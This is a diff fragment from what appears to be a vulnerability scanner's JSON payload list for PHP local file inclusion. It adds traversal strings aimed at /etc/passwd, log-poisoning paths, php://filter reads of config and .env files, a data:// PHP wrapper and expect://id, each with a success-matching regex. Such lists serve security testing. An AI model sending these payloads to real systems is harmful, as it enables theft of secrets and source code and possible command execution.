+    "category": "encoded-bypass",
+    "target_os": "any",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "....//....//etc/passwd",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
+    "category": "encoded-bypass",
+    "target_os": "any",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "..//////..//////etc/passwd",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
+    "category": "encoded-bypass",
+    "target_os": "any",
+    "severity": "high",
+    "cvss": "7.5",
+    "payload": "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+    "matcher": "root:[x*]?:0:0"
+  },
+  {
+    "category": "log-poison",
+    "target_os": "linux",
+    "severity": "high",
+    "cvss": "8.1",
+    "payload": "/var/log/apache2/access.log",
+    "matcher": "(<\\?php|GET\\s|User-Agent)"
+  },
+  {
+    "category": "log-poison",
+    "target_os": "linux",
+    "severity": "high",
+    "cvss": "8.1",
+    "payload": "/var/log/nginx/access.log",
+    "matcher": "(<\\?php|GET\\s|User-Agent)"
+  },
+  {
+    "category": "log-poison",
+    "target_os": "linux",
+    "severity": "high",
+    "cvss": "8.1",
+    "payload": "/var/log/auth.log",
+    "matcher": "(<\\?php|sshd|Failed password)"
+  },
+  {
+    "category": "log-poison",
+    "target_os": "linux",
+    "severity": "high",
+    "cvss": "8.1",
+    "payload": "/var/log/mail.log",
+    "matcher": "(<\\?php|postfix)"
+  },
+  {
+    "category": "log-poison",
+    "target_os": "linux",
+    "severity": "high",
+    "cvss": "8.1",
+    "payload": "/var/log/vsftpd.log",
+    "matcher": "(<\\?php|FTP)"
+  },
+  {
+    "category": "log-poison",
+    "target_os": "linux",
+    "severity": "high",
+    "cvss": "8.1",
+    "payload": "/proc/self/fd/1",
+    "matcher": "(<\\?php|.+)"
+  },
+  {
+    "category": "log-poison",
+    "target_os": "linux",
+    "severity": "high",
+    "cvss": "8.1",
+    "payload": "/proc/self/environ",
+    "matcher": "(<\\?php|HTTP_USER_AGENT)"
+  },
+  {
+    "category": "php-filter",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.1",
+    "payload": "php://filter/convert.base64-encode/resource=index.php",
+    "matcher": "<\\?php"
+  },
+  {
+    "category": "php-filter",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.1",
+    "payload": "php://filter/convert.base64-encode/resource=config.php",
+    "matcher": "<\\?php"
+  },
+  {
+    "category": "php-filter",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.1",
+    "payload": "php://filter/convert.base64-encode/resource=wp-config.php",
+    "matcher": "<\\?php"
+  },
+  {
+    "category": "php-filter",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.1",
+    "payload": "php://filter/convert.base64-encode/resource=database.php",
+    "matcher": "<\\?php"
+  },
+  {
+    "category": "php-filter",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.1",
+    "payload": "php://filter/convert.base64-encode/resource=configuration.php",
+    "matcher": "<\\?php"
+  },
+  {
+    "category": "php-filter",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.1",
+    "payload": "php://filter/convert.base64-encode/resource=settings.php",
+    "matcher": "<\\?php"
+  },
+  {
+    "category": "php-filter",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.1",
+    "payload": "php://filter/convert.base64-encode/resource=app/config/database.php",
+    "matcher": "<\\?php"
+  },
+  {
+    "category": "php-filter",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.1",
+    "payload": "php://filter/read=convert.base64-encode/resource=.env",
+    "matcher": "."
+  },
+  {
+    "category": "php-filter",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.1",
+    "payload": "php://filter/read=convert.base64-encode/resource=index.php",
+    "matcher": "<\\?php"
+  },
+  {
+    "category": "php-filter",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.1",
+    "payload": "php://filter/zlib.deflate/convert.base64-encode/resource=index.php",
+    "matcher": "."
+  },
+  {
+    "category": "php-filter",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.1",
+    "payload": "php://filter/convert.iconv.utf-8.utf-16le/resource=index.php",
+    "matcher": "."
+  },
+  {
+    "category": "php-filter",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.1",
+    "payload": "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode/resource=index.php",
+    "matcher": "."
+  },
+  {
+    "category": "php-filter",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.1",
+    "payload": "pHp://FilTer/convert.base64-encode/resource=index.php",
+    "matcher": "<\\?php"
+  },
+  {
+    "category": "php-filter",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.1",
+    "payload": "php://filter/string.rot13/resource=/etc/passwd",
+    "matcher": "(ebbg:|root:[x*]?:0:0)"
+  },
+  {
+    "category": "php-filter",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.1",
+    "payload": "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
+    "matcher": "(phpinfo|<\\?php)"
+  },
+  {
+    "category": "php-filter",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.1",
+    "payload": "expect://id",
+    "matcher": "uid=\\d+"
+  },
+  {
+    "category": "php-filter",
+    "target_os": "linux",
+    "severity": "critical",
+    "cvss": "9.1",
+    "payload": "php://filter/convert.base64-encode/resource=../config.php",
+    "matcher": "<\\?php"
+  }
 ]
